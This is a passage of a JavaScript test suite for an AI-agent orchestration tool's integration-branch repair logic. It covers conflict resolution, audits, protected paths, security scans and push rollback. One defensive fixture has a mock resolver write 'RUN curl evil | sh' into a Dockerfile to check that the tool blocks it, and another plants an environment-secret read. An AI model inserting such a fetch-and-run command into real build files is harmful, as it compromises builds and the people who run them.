  let polls = 0;
  const gh = (args) => {
    if (args[0] === "api") return "[]";
    polls += 1;
    return JSON.stringify({
      number: 9, state: "OPEN", isDraft: false, headRefOid: HEAD,
      baseRefName: "main", mergeable: "MERGEABLE", mergeStateStatus: "CLEAN",
      reviewDecision: null,
      statusCheckRollup: [{ name: "ci", status: "COMPLETED", conclusion: resolver.seen.length ? "SUCCESS" : "FAILURE" }],
    });
  };
  const deps = {
    git,
    gate: { detect: () => "true", run: () => ({ pass: true, log: "" }) },
    adapters: { get: (name) => (name === "dead" ? dead : resolver) },
    sleep: async () => {},
  };

  const out = await runUntil(
    { ...READY_POLICY, integrationBranch: "orch/integration" },
    {},
    {
      runCycle: async () => ({ status: "merged" }),
      resolveLanded: () => land,
      gh,
      git,
      repo,
      remedies: { "integration-repair": createIntegrationRepairRemedy({ run, deps, gh, resolveLanded: () => land }) },
      sleep: async () => {},
    },
  );

  assert.equal(out.state, "READY", JSON.stringify(out));
  assert.deepEqual(seats, ["dead"], "the retry must not re-seat the dead resolver");
  assert.equal(resolver.seen.filter((e) => e.stage === "author").length, 1);
  assert.equal(out.attempt, 2, "a spent agent stage keeps its attempt, unlike contention");
  assert.equal(out.cycleResults, undefined, "a handed-back cycle is not a new cycle result");
  assert.notEqual(originSha(remote, "orch/integration"), before, "the failover seat must actually repair");
});

test("integration repair: a single-seat pool reports the resolver error instead of retrying itself", async () => {
  const { repo } = conflictFixture();
  let calls = 0;
  const dead = { async author() { calls += 1; throw new Error("adapter exploded"); } };
  const out = await runRepair(repo, {
    cfg: repairCfg({ main: { conflictResolutionResolvers: [{ agent: "dead" }] } }),
    agents: { dead },
  });

  assert.match(out.result.reason, /resolver failed: adapter exploded/);
  assert.equal(out.cycle, undefined);
  assert.equal(calls, 1);
});

test("integration repair: the last attempt reports the resolver error rather than a bare cap", async () => {
  const { repo } = conflictFixture();
  const dead = {
    async author() { throw new Error("adapter exploded"); },
    async audit() { return { decision: "AGREE" }; },
  };
  const out = await integrationRepairRemedy({
    name: "integration-repair",
    policy: { maxAttempts: 3 },
    failure: { class: "REMOTE_CONFLICTING", fingerprint: "fp" },
    // Already on the last attempt the policy allows.
    record: { attempt: 3, failures: [{ fingerprint: "fp", remedy: "integration-repair" }] },
    cycle: { status: "merged" },
    run: {
      repo,
      orchDir: join(repo, ".orch"),
      sid: "sidtest",
      cfg: repairCfg({
        agents: ["dead", "resolver"],
        main: { conflictResolutionResolvers: [{ agent: "dead" }, { agent: "resolver" }] },
      }),
    },
    deps: {
      git,
      gate: { detect: () => "true", run: () => ({ pass: true, log: "" }) },
      adapters: { get: () => dead },
    },
    resolveLanded: () => ({ pr: { number: 9 }, landing: "standing", branch: "orch/integration" }),
    gh: () => "",
  });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /resolver failed: adapter exploded/);
});

test("integration repair: REMOTE_BEHIND updates the PR branch, gates the new tip and reconciles locally", async () => {
  const { repo, remote } = conflictFixture();
  // Make origin/orch/integration a strict ancestor of main so update-branch is
  // a fast-forward the peer can perform for real.
  const peer = cloneRemote(remote);
  git.git(["switch", "orch/integration"], peer);
  git.git(["merge", "--no-edit", "-X", "theirs", "origin/main"], peer);
  const ghCalls = [];
  const gh = (args) => {
    ghCalls.push(args);
    if (args[0] === "api") { git.git(["push", "origin", "orch/integration"], peer); return "{}"; }
    return "";
  };
  const out = await runRepair(repo, { failureClass: "REMOTE_BEHIND", gh });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.ok(ghCalls.some((a) => a.join(" ").includes("update-branch")));
  assert.equal(
    git.git(["rev-parse", "orch/integration"], repo),
    originSha(remote, "orch/integration"),
    "the local integration branch must be fast-forwarded onto the repaired tip",
  );
});

test("integration repair: a clean-merge REMOTE_CI_RED audits the resolver's own diff, not base's", async () => {
  // No conflict: base only adds `basefile.txt`, so the merge is clean and the
  // failure is a red check (design §10A's other resolver path). The resolver
  // then edits a file BASE ALSO TOUCHED — the case where "what did the
  // resolver change" cannot be read off the merge result alone.
  const repo = newRepo();
  const remote = addOrigin(repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "integ.txt", "integration\n", "integration change");
  git.git(["push", "-u", "origin", "orch/integration"], repo);
  git.git(["switch", "main"], repo);
  commitFile(repo, "basefile.txt", "base v1\n", "base change");
  git.git(["push", "origin", "main"], repo);
  git.gitTry(["update-ref", "-d", "refs/remotes/origin/orch/integration"], repo);
  const before = originSha(remote, "orch/integration");

  const resolver = resolvingAgent("base v2\n", "basefile.txt");
  const audited = [];
  const reviewer = {
    async audit(branch, wd, opts) {
      const shown = git.gitTry(["show", `${branch}:basefile.txt`], wd);
      audited.push({ content: shown.out, stageTimeoutMs: opts?.stageTimeoutMs });
      return { decision: "AGREE", reason: "check fixed" };
    },
  };
  const out = await runRepair(repo, { failureClass: "REMOTE_CI_RED", agents: { resolver, reviewer } });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.deepEqual(resolver.seen.map((s) => s.stageTimeoutMs), [7 * 60_000]);
  // A resolver edit to a path base also brought in must NOT be excluded as
  // "base's own delta" — it still owes an audit round.
  assert.deepEqual(audited, [{ content: "base v2\n", stageTimeoutMs: 7 * 60_000 }]);
  assert.notEqual(originSha(remote, "orch/integration"), before);
});

test("integration repair: a protected path base merged in cleanly is not charged to the resolver", async () => {
  const { repo, remote } = conflictFixture();
  // `Dockerfile` is protected and NOT in autoResolveConflictPaths, and it
  // arrives purely from base's own incoming delta with no conflict at all.
  // Scanning `preSha...HEAD` wholesale would make it a terminal
  // POLICY_PROTECTED_PATH on every run that merges a base which touched it.
  git.git(["switch", "main"], repo);
  commitFile(repo, "Dockerfile", "FROM node:22\n", "base touches the Dockerfile");
  git.git(["push", "origin", "main"], repo);
  const before = originSha(remote, "orch/integration");

  const out = await runRepair(repo, {
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.result?.failureClass, undefined, out.result?.reason);
  assert.equal(out.cycle?.status, "merged");
  assert.notEqual(originSha(remote, "orch/integration"), before);
  assert.equal(git.git(["show", "orch/integration:Dockerfile"], remote), "FROM node:22");
});

// A conflict confined to `autoResolveConflictPaths` (`package.json` and friends)
// is exactly what the allowlist exists to let through: those paths are ALSO
// `DEFAULT_PROTECTED`, so both the path floor and the security scan's
// `guardrail-touch` rule fire on them unless the operator's opt-in is honoured
// by both.
function allowlistedConflictFixture() {
  const repo = newRepo();
  const remote = addOrigin(repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "package.json", '{"version":"1.0.0"}\n', "integration version");
  git.git(["push", "-u", "origin", "orch/integration"], repo);
  git.git(["switch", "main"], repo);
  commitFile(repo, "package.json", '{"version":"9.9.9"}\n', "base version");
  commitFile(repo, "Dockerfile", "FROM node:22\n", "base dockerfile");
  git.git(["push", "origin", "main"], repo);
  git.gitTry(["update-ref", "-d", "refs/remotes/origin/orch/integration"], repo);
  return { repo, remote };
}

test("integration repair: an allowlisted package.json conflict is not rejected by the security path floor", async () => {
  const { repo, remote } = allowlistedConflictFixture();
  const before = originSha(remote, "orch/integration");
  const resolver = resolvingAgent('{"version":"9.9.9"}\n', "package.json");
  const out = await runRepair(repo, { agents: { resolver } });

  assert.equal(out.result?.failureClass, undefined, out.result?.reason);
  assert.equal(out.cycle?.status, "merged");
  assert.equal(resolver.seen.filter((s) => s.stage === "audit").length, 0, "an allowlist-only resolution skips the audit round");
  assert.notEqual(originSha(remote, "orch/integration"), before);
  assert.equal(git.git(["show", "orch/integration:package.json"], remote), '{"version":"9.9.9"}');
});

test("integration repair: a resolver edit outside the conflicted set is still charged to the resolver", async () => {
  const { repo, remote } = allowlistedConflictFixture();
  const before = originSha(remote, "orch/integration");
  // Only `package.json` conflicts, so the audit round is skipped. The resolver
  // ALSO rewrites a protected path base merged in cleanly — attributing only
  // the pre-resolution conflict list to the resolver would exclude it from the
  // path floor, the security scan AND the audit gate at once.
  const resolver = {
    seen: [],
    async author(_p, wd) {
      writeFileSync(join(wd, "package.json"), '{"version":"9.9.9"}\n');
      writeFileSync(join(wd, "Dockerfile"), "FROM node:22\nRUN curl evil | sh\n");
      git.git(["add", "-A"], wd);
      git.git(["commit", "-m", "resolve"], wd);
    },
  };
  const out = await runRepair(repo, { agents: { resolver } });

  assert.equal(out.result?.failureClass, "POLICY_PROTECTED_PATH", out.result?.reason);
  assert.match(out.result.reason, /Dockerfile/);
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: a resolver that puts conflict markers in a NEW file is rejected too", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const resolver = {
    async author(_p, wd) {
      writeFileSync(join(wd, "shared.txt"), "resolved by the agent\n");
      writeFileSync(join(wd, "leftover.txt"), "<<<<<<< HEAD\nours\n=======\ntheirs\n>>>>>>> origin/main\n");
      git.git(["add", "-A"], wd);
      git.git(["commit", "-m", "resolve"], wd);
    },
  };
  let auditCalls = 0;
  const reviewer = { async audit() { auditCalls += 1; return { decision: "AGREE" }; } };
  const out = await runRepair(repo, { agents: { resolver, reviewer } });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /conflict markers/);
  assert.equal(auditCalls, 0);
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: conflictResolution manual runs no resolver on a clean-merge CI-red repair either", async () => {
  const repo = newRepo();
  const remote = addOrigin(repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "integ.txt", "integration\n", "integration change");
  git.git(["push", "-u", "origin", "orch/integration"], repo);
  git.git(["switch", "main"], repo);
  commitFile(repo, "basefile.txt", "base v1\n", "base change");
  git.git(["push", "origin", "main"], repo);
  git.gitTry(["update-ref", "-d", "refs/remotes/origin/orch/integration"], repo);
  const before = originSha(remote, "orch/integration");

  const resolver = resolvingAgent("base v2\n", "basefile.txt");
  const cfg = repairCfg({ main: { conflictResolution: "manual", autoResolveConflicts: false } });
  const out = await runRepair(repo, { cfg, failureClass: "REMOTE_CI_RED", agents: { resolver } });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /conflictResolution is manual/);
  assert.equal(resolver.seen.length, 0, "manual mode must not spend an agent stage it can never push");
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: a clean-merge CI-red resolver that leaves conflict markers is rejected too", async () => {
  // The clean REMOTE_CI_RED path never had a merge conflict, so git's own
  // unmerged-path bookkeeping never fires — the marker floor is the only thing
  // between a resolver pasting `<<<<<<<` into a "fixed" file and origin.
  const repo = newRepo();
  const remote = addOrigin(repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "integ.txt", "integration\n", "integration change");
  git.git(["push", "-u", "origin", "orch/integration"], repo);
  git.git(["switch", "main"], repo);
  commitFile(repo, "basefile.txt", "base v1\n", "base change");
  git.git(["push", "origin", "main"], repo);
  git.gitTry(["update-ref", "-d", "refs/remotes/origin/orch/integration"], repo);
  const before = originSha(remote, "orch/integration");

  const resolver = {
    async author(_p, wd) {
      writeFileSync(join(wd, "integ.txt"), "<<<<<<< HEAD\nours\n=======\ntheirs\n>>>>>>> origin/main\n");
      git.git(["add", "-A"], wd);
      git.git(["commit", "-m", "fix the red check"], wd);
    },
  };
  let auditCalls = 0;
  const reviewer = { async audit() { auditCalls += 1; return { decision: "AGREE" }; } };
  const out = await runRepair(repo, { failureClass: "REMOTE_CI_RED", agents: { resolver, reviewer } });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /conflict markers/);
  assert.equal(auditCalls, 0, "markers must be caught before anything downstream can pass them");
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: a failed local reconcile blocks the push instead of racing it", async () => {
  // Was "reported after a successful push": the push now happens LAST, so a
  // reconcile that cannot bring local forward stops the repair with origin
  // still holding the pre-repair tip. Nothing to report half-done any more.
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const gitDep = { ...git, reconcileIntegrationToOrigin: () => ({ ok: false, reason: "worktree busy" }) };
  const out = await runRepair(repo, {
    gitDep,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(originSha(remote, "orch/integration"), before, "origin must not move when local cannot be reconciled");
  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /worktree busy/);
});

test("integration repair: a resolver that throws leaves origin untouched", async () => {
  // The pre-agent `git add -A` (which pins the conflicted tree) stages the
  // markers, so this also proves the abort path still works from a resolved
  // index.
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const resolver = { async author() { throw new Error("resolver exploded"); } };
  const out = await runRepair(repo, { agents: { resolver } });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /resolver failed: resolver exploded/);
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: a reviewer configured via `reviewers:` is a valid audit seat", async () => {
  // Roles configured as `reviewers:` instead of a bare `agents:` pool: reading
  // only `agents` found no seat differing from the resolver and failed the
  // repair closed on a perfectly valid configuration.
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const audited = [];
  const reviewer = { async audit(branch) { audited.push(branch); return { decision: "AGREE" }; } };
  const cfg = repairCfg({ agents: ["resolver"], reviewers: ["codex"] });
  const out = await runRepair(repo, { cfg, agents: { resolver: resolvingAgent(), codex: reviewer } });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.equal(audited.length, 1, "the configured reviewer must actually audit the resolution");
  assert.notEqual(originSha(remote, "orch/integration"), before);
});

test("integration repair: an unreadable security diff blocks the push instead of scanning nothing", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  // Only the `--raw` footprint reads fail; `conflictedPathsIn` (also a `git
  // diff`) still works, so the repair really does reach the security floors.
  // Their input then parses to an empty path list — an empty scan, a green
  // gate and a push, unless the read itself fails closed.
  const gitDep = {
    ...git,
    gitTry: (args, wd) => (args[0] === "diff" && args.includes("--raw")
      ? { ok: false, out: "fatal: bad revision" }
      : git.gitTry(args, wd)),
  };
  const out = await runRepair(repo, {
    gitDep,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /could not read the repair diff/);
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: an unreadable footprint diff blocks the push before the gate", async () => {
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  // The range reads taken AFTER the resolver ran and the marker scan passed:
  // `preSha...HEAD`, `preSha...origin/<base>` and the final scan diff. Only the
  // range form fails here, so the pre-agent tree diff still succeeds and the
  // repair reaches the protected-path floor and the security scan with an empty
  // path list — clean scan, green gate, push — unless the read fails closed.
  const gitDep = {
    ...git,
    gitTry: (args, wd) => (args[0] === "diff" && args.some((a) => a.includes("..."))
      ? { ok: false, out: "fatal: bad revision" }
      : git.gitTry(args, wd)),
  };
  let auditCalls = 0;
  const out = await runRepair(repo, {
    gitDep,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { auditCalls += 1; return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /could not read the repair diff/);
  assert.equal(auditCalls, 0);
  assert.equal(originSha(remote, "orch/integration"), before);
});

// ---------------------------------------------------------------------------
// Second review round: four defects the first cycle shipped green. Each test
// below fails against that branch tip.

test("integration repair: a commit only the local integration worktree holds is merged in, not stranded", async () => {
  // The scratch resolution is built on `origin/<branch>`, so it cannot contain a
  // commit that landed locally and has not been pushed yet. Pushing the scratch
  // result first therefore advances origin past work it does not carry, and the
  // ff-only reconcile that used to follow can never bring local forward again.
  const { repo, remote } = conflictFixture();
  const integration = git.ensureIntegrationWorktree(repo, join(repo, ".orch"), "orch/integration", "main");
  commitFile(integration, "local-only.txt", "landed locally, not pushed yet\n", "local land");
  const localOnly = git.git(["rev-parse", "HEAD"], integration);

  const out = await runRepair(repo, {
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.ok(
    git.gitTry(["merge-base", "--is-ancestor", localOnly, "orch/integration"], remote).ok,
    "the local-only commit must be an ancestor of the pushed integration tip",
  );
  assert.equal(git.git(["rev-parse", "HEAD"], integration), originSha(remote, "orch/integration"));
});

test("integration repair: the test gate carries the stageTimeout watchdog too (#56/#58)", async () => {
  const { repo } = conflictFixture();
  const timeouts = [];
  const gate = {
    detect: () => "true",
    run: (_cmd, _cwd, timeoutMs) => { timeouts.push(timeoutMs); return { pass: true, log: "" }; },
  };
  const out = await runRepair(repo, {
    gate,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  // Hand-computed from `repairCfg`'s `stageTimeout: 7` — 7 * 60_000. A gate run
  // with no timeout waits forever while holding `integration-repair.lock`.
  assert.deepEqual(timeouts, [420_000]);
});

test("integration repair: the REMOTE_BEHIND gate carries the watchdog as well", async () => {
  const { repo, remote } = conflictFixture();
  const peer = cloneRemote(remote);
  git.git(["switch", "orch/integration"], peer);
  git.git(["merge", "--no-edit", "-X", "theirs", "origin/main"], peer);
  const gh = (args) => {
    if (args[0] === "api") { git.git(["push", "origin", "orch/integration"], peer); return "{}"; }
    return "";
  };
  const timeouts = [];
  const gate = {
    detect: () => "true",
    run: (_cmd, _cwd, timeoutMs) => { timeouts.push(timeoutMs); return { pass: true, log: "" }; },
  };
  const out = await runRepair(repo, { failureClass: "REMOTE_BEHIND", gh, gate });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.deepEqual(timeouts, [420_000]);
});

test("integration repair: the resolver seat rotates on the cycle's own conflict-resolver cursor", async () => {
  // cli.js's `conflictResolvers` rotates a multi-entry pool through
  // `.orch/last-conflict-resolver`. Taking pool entry zero here pinned one seat
  // forever, so a repair never followed the rotation the rest of the run does.
  const { repo } = conflictFixture();
  mkdirSync(join(repo, ".orch"), { recursive: true });
  writeFileSync(join(repo, ".orch", "last-conflict-resolver"), "0");
  const cfg = repairCfg({
    agents: ["one", "two"],
    main: {
      conflictResolutionResolvers: [
        { agent: "one", model: null, effort: null },
        { agent: "two", model: null, effort: null },
      ],
    },
  });
  const one = resolvingAgent();
  const two = resolvingAgent();
  const out = await runRepair(repo, { cfg, agents: { one, two } });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  // Cursor said seat 0 went last, so this repair is seat 1's turn: `two`
  // resolves and `one` — the next differing entry in the rotated order — audits.
  assert.deepEqual(two.seen.map((s) => s.stage), ["author"]);
  assert.deepEqual(one.seen.map((s) => s.stage), ["audit"]);
  assert.equal(readFileSync(join(repo, ".orch", "last-conflict-resolver"), "utf8"), "1");
});

test("integration repair: base's own content on a resolver-touched file is not scanned as the resolver's", async () => {
  // Clean merge + red check: base ADDS `basefile.js` containing an env read,
  // and the resolver then edits that same file. Diffing from before the merge
  // charges base's `process.env` line to the resolver and terminates the repair
  // as a SECURITY_FINDING; only the resolver's own hunk is its work.
  const repo = newRepo();
  const remote = addOrigin(repo);
  git.git(["switch", "-c", "orch/integration"], repo);
  commitFile(repo, "integ.txt", "integration\n", "integration change");
  git.git(["push", "-u", "origin", "orch/integration"], repo);
  git.git(["switch", "main"], repo);
  commitFile(repo, "basefile.js", "const token = process.env.TOKEN;\n", "base reads the environment");
  git.git(["push", "origin", "main"], repo);
  git.gitTry(["update-ref", "-d", "refs/remotes/origin/orch/integration"], repo);
  const before = originSha(remote, "orch/integration");

  const resolver = resolvingAgent("const token = process.env.TOKEN;\nconst fixed = 1;\n", "basefile.js");
  const out = await runRepair(repo, {
    failureClass: "REMOTE_CI_RED",
    agents: { resolver, reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.result?.failureClass, undefined, out.result?.reason);
  assert.equal(out.cycle?.status, "merged");
  assert.notEqual(originSha(remote, "orch/integration"), before);
});

test("integration repair: a resolver that writes an env read is a terminal SECURITY_FINDING", async () => {
  // The positive half of the attribution pair above: narrowing the content scan
  // to the resolver's own tree must not narrow it to nothing. Diffing the pinned
  // conflicted tree against the resolution shows the marker lines and both
  // sides' text as removals and the resolver's line as the one addition, so
  // `env-read` fires on exactly what the resolver wrote.
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");

  const out = await runRepair(repo, {
    agents: { resolver: resolvingAgent("const t = process.env.SECRET;\n"), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.result?.failureClass, "SECURITY_FINDING", out.result?.reason);
  assert.equal(out.result?.blockedReason, "security-finding");
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: a rejected push rolls the integration worktree back off the merge", async () => {
  // Merging locally before the push is what strands nothing on a WON race; on a
  // LOST one it would leave local and origin diverged, which wedges finalize.
  const { repo, remote } = conflictFixture();
  const integration = git.ensureIntegrationWorktree(repo, join(repo, ".orch"), "orch/integration", "main");
  commitFile(integration, "local-only.txt", "landed locally, not pushed yet\n", "local land");
  const localTip = git.git(["rev-parse", "HEAD"], integration);
  const before = originSha(remote, "orch/integration");
  const gitDep = {
    ...git,
    gitTry: (args, wd) => (args[0] === "push"
      ? { ok: false, out: "! [rejected] orch/integration -> orch/integration (fetch first)" }
      : git.gitTry(args, wd)),
  };

  const out = await runRepair(repo, {
    gitDep,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /push rejected/);
  // The resolver already spent an agent stage, so unlike the REMOTE_BEHIND path
  // this attempt stays consumed — the landing's "nothing landed" signal must not
  // leak a refund into a path that paid for one.
  assert.equal(out.record.attempt, 1);
  assert.equal(originSha(remote, "orch/integration"), before);
  assert.equal(git.git(["rev-parse", "HEAD"], integration), localTip, "the lost race must leave local exactly as it was");
});

test("integration repair: a local commit conflicting with the resolution stops the repair, origin untouched", async () => {
  const { repo, remote } = conflictFixture();
  const integration = git.ensureIntegrationWorktree(repo, join(repo, ".orch"), "orch/integration", "main");
  // Same file the resolution rewrites, different content: merging the repaired
  // tip into the persistent worktree conflicts.
  commitFile(integration, "shared.txt", "a third opinion\n", "local land on the same file");
  const localTip = git.git(["rev-parse", "HEAD"], integration);
  const before = originSha(remote, "orch/integration");

  const out = await runRepair(repo, {
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /could not merge the repaired tip/);
  assert.equal(originSha(remote, "orch/integration"), before);
  assert.equal(git.git(["rev-parse", "HEAD"], integration), localTip);
});

// --- landRepairedTip: the shared landing sequence (§10A) -------------------
// Both repair paths land through one function, so these four cases pin the
// contract #569's resolver path will call: fast-forward, real merge, red
// re-gate, lost race.

test("integration repair: a fast-forward landing pushes the gated tree itself, so it is not re-gated", async () => {
  // `conflictFixture` leaves the local integration branch exactly at origin's
  // tip, so merging the repaired tip in is a genuine fast-forward: the tree
  // that reaches origin IS the tree the gate already ran on.
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const cwds = [];
  const gate = { detect: () => "true", run: (_cmd, cwd) => { cwds.push(cwd); return { pass: true, log: "" }; } };

  const out = await runRepair(repo, {
    gate,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.equal(cwds.length, 1, "a fast-forward needs no second gate run");
  assert.ok(cwds[0].endsWith("orch-repair-sidtest"), "the one gate run is the scratch-tree one");
  assert.notEqual(originSha(remote, "orch/integration"), before, "the repair still landed");
});

test("integration repair: a non-fast-forward landing re-gates the merged tree before pushing", async () => {
  // A commit that landed locally and has not been pushed makes the merge real,
  // so the pushed tree is a combination neither gate run has seen. `finalize`
  // re-gates at exactly this point (src/finalize.js:233) and so does this.
  const { repo, remote } = conflictFixture();
  const integration = git.ensureIntegrationWorktree(repo, join(repo, ".orch"), "orch/integration", "main");
  commitFile(integration, "local-only.txt", "landed locally, not pushed yet\n", "local land");
  const calls = [];
  const gate = { detect: () => "true", run: (_cmd, cwd, timeoutMs) => { calls.push({ cwd, timeoutMs }); return { pass: true, log: "" }; } };

  const out = await runRepair(repo, {
    gate,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.equal(calls.length, 2, "the merged tree gets its own gate run");
  assert.equal(calls[1].cwd, integration, "the re-gate runs on the tree that is about to be pushed");
  // Hand-computed from `repairCfg`'s `stageTimeout: 7` — 7 * 60_000 (#56/#58).
  // This run holds `merge.lock`, so an uncapped one would hold it forever.
  assert.equal(calls[1].timeoutMs, 420_000);
  assert.equal(git.git(["rev-parse", "HEAD"], integration), originSha(remote, "orch/integration"));
});

test("integration repair: a red re-gate rolls the integration worktree back and pushes nothing", async () => {
  const { repo, remote } = conflictFixture();
  const integration = git.ensureIntegrationWorktree(repo, join(repo, ".orch"), "orch/integration", "main");
  commitFile(integration, "local-only.txt", "landed locally, not pushed yet\n", "local land");
  const localTip = git.git(["rev-parse", "HEAD"], integration);
  const before = originSha(remote, "orch/integration");
  // Green on the scratch resolution, red on the merged tree — the exact case a
  // scratch-only gate cannot see.
  let runs = 0;
  const gate = { detect: () => "true", run: () => { runs += 1; return { pass: runs === 1, log: "" }; } };

  const out = await runRepair(repo, {
    gate,
    agents: { resolver: resolvingAgent(), reviewer: { async audit() { return { decision: "AGREE" }; } } },
  });

  assert.equal(out.cycle, undefined);
  assert.match(out.result.reason, /gate red on orch\/integration/);
  assert.equal(originSha(remote, "orch/integration"), before, "a tree the gate failed must never reach origin");
  assert.equal(git.git(["rev-parse", "HEAD"], integration), localTip, "the failed merge must be rolled back");
});

test("integration repair: a REMOTE_BEHIND landing that loses the push race rolls back and refunds the attempt", async () => {
  // Nothing but a gate run is spent on the REMOTE_BEHIND path — no agent — so
  // losing the race to a peer costs this repair no attempt. (The resolver path
  // below keeps its attempt: it already paid for a stage.)
  const { repo, remote } = conflictFixture();
  const integration = git.ensureIntegrationWorktree(repo, join(repo, ".orch"), "orch/integration", "main");
  commitFile(integration, "local-only.txt", "landed locally, not pushed yet\n", "local land");
  const localTip = git.git(["rev-parse", "HEAD"], integration);
  const before = originSha(remote, "orch/integration");
  const gitDep = {
    ...git,
    gitTry: (args, wd) => (args[0] === "push"
      ? { ok: false, out: "! [rejected] orch/integration -> orch/integration (fetch first)" }
      : git.gitTry(args, wd)),
  };

  const out = await runRepair(repo, { failureClass: "REMOTE_BEHIND", gh: () => "{}", gitDep });

  assert.match(out.result.reason, /push rejected/);
  assert.equal(out.record.attempt, 0, "an agent-free repair that landed nothing must not burn an attempt");
  assert.equal(originSha(remote, "orch/integration"), before);
  assert.equal(git.git(["rev-parse", "HEAD"], integration), localTip, "the lost race must leave local exactly as it was");
});

test("integration repair: a REMOTE_BEHIND landing re-gates and pushes the local-ahead integration branch", async () => {
  // The positive half of the change: `repairBehind` used to stop at the local
  // reconcile and never push, so a commit that had landed locally sat unpushed
  // behind a "repaired" branch. Landing through `landRepairedTip` pushes it,
  // and because that merge is not a fast-forward the merged tree is gated first.
  const { repo, remote } = conflictFixture();
  const integration = git.ensureIntegrationWorktree(repo, join(repo, ".orch"), "orch/integration", "main");
  commitFile(integration, "local-only.txt", "landed locally, not pushed yet\n", "local land");
  const localTip = git.git(["rev-parse", "HEAD"], integration);
  const calls = [];
  const gate = { detect: () => "true", run: (_cmd, cwd, timeoutMs) => { calls.push({ cwd, timeoutMs }); return { pass: true, log: "" }; } };

  const out = await runRepair(repo, { failureClass: "REMOTE_BEHIND", gh: () => "{}", gate });

  assert.equal(out.cycle?.status, "merged", out.result?.reason);
  assert.equal(originSha(remote, "orch/integration"), localTip, "the local-only commit must reach origin");
  assert.equal(calls.length, 2, "the merged tree is not the gated tip, so it gets its own gate run");
  assert.equal(calls[1].cwd, integration);
  // Hand-computed from `repairCfg`'s `stageTimeout: 7` — 7 * 60_000 (#56/#58).
  assert.equal(calls[1].timeoutMs, 420_000);
});

test("integration repair: a push rejected for auth, not for a race, keeps the attempt", async () => {
  // `raced` buys the caller a free attempt back because a race clears on the
  // next poll. Auth (or branch protection, or a pre-receive hook) does not: the
  // same push fails identically forever, so refunding there would spend the
  // controller's remedy loops re-running a repair that cannot land.
  const { repo, remote } = conflictFixture();
  const before = originSha(remote, "orch/integration");
  const gitDep = {
    ...git,
    gitTry: (args, wd) => (args[0] === "push"
      ? { ok: false, out: "remote: Permission to o/r.git denied to nobody.\nfatal: unable to access ...: 403" }
      : git.gitTry(args, wd)),
  };

  const out = await runRepair(repo, { failureClass: "REMOTE_BEHIND", gh: () => "{}", gitDep });

  assert.match(out.result.reason, /push rejected/);
  assert.match(out.result.reason, /403/, "the real error must survive into the reason");
  assert.equal(out.record.attempt, 1, "a push that can never succeed must not be refunded as a race");
  assert.equal(originSha(remote, "orch/integration"), before);
});

test("integration repair: a diverged per-cycle local stops the repair BEFORE origin is pushed", async () => {
  // The divergence was reported after the push, so origin had already taken the
  // repaired tip: the local-only commits then hung off a ref that could never
  // fast-forward again. Ask first, push second.
  const { repo, remote } = conflictFixture();
  git.git(["switch", "-c", "feature", "orch/integration"], repo);
  git.git(["push", "-u", "origin", "feature"], repo);
  commitFile(repo, "local-only.txt", "not pushed\n", "local-only work");
  git.git(["switch", "main"], repo);
  const before = originSha(remote, "feature");
  const pushes = [];
  const gitDep = {
    ...git,
    gitTry: (args, wd) => {
